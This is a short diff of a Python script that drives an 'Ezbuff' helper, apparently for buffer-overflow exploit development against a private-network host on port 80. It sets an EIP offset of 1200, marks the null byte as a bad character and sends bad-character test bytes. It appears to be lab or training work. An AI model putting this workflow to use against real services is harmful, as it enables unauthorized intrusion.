@@ -6,17 +6,13 @@ from sys import argv
 
 
 def main():
-	test = Ezbuff("192.168.13.234", 80)
+	test = Ezbuff("192.168.230.10", 80)
 
-	print(repr(test))
-	print(str(test))
+	test.offset = 1200
 
-	test.jump_eip = r"\x8f\x35\x4a\x5f"
-	test.add_bad_char(r"\xaa")
+	test.add_bad_char(r'\x00')
 
-	print(test.bad_chars, test.jump_eip)
-
-	print(repr(test))
+	test.send_bad_chars()
 
 
 if __name__ == '__main__':
